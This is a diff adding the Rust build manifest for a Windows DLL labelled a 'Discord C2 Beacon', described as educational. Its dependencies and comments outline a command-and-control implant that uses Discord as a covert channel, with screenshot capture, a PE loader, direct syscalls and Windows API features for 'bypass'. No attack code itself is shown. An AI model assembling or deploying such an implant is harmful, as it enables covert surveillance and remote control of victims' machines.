@@ -1,0 +1,58 @@
+[package]
+name = "beacon"
+version = "0.1.0"
+edition = "2021"
+description = "Discord C2 Beacon DLL - Educational purposes only"
+
+[lib]
+name = "beacon"
+crate-type = ["cdylib"]
+
+[dependencies]
+# Shared C2 library (PE loader, syscalls)
+c2_common = { path = "../common" }
+
+# HTTP client for Discord API (blocking for simplicity in DLL)
+reqwest = { version = "0.12", default-features = false, features = [
+    "blocking", 
+    "json", 
+    "multipart",
+    "rustls-tls"  # Use rustls instead of native-tls for easier cross-compilation
+] }
+
+# JSON/TOML serialization
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+toml = "0.8"
+
+# Error handling
+thiserror = "1.0"
+
+# UUID generation for unique filenames
+uuid = { version = "1.0", features = ["v4"] }
+
+# Image processing for screenshots
+image = { version = "0.25", default-features = false, features = ["png"] }
+
+# Windows hostname detection
+hostname = "0.4"
+
+[target.'cfg(windows)'.dependencies]
+# Screen capture
+xcap = "0.3"
+
+# Windows API - extensive features for bypass and system interaction
+winapi = { version = "0.3.9", features = [
+    "minwindef",
+    "ntdef", 
+    "ntstatus",
+    "winnt",
+    "errhandlingapi",
+    "libloaderapi",
+    "minwinbase",
+    "memoryapi",
+    "processthreadsapi",
+    "synchapi",
+    "excpt",
+] }
+ntapi = "0.4"
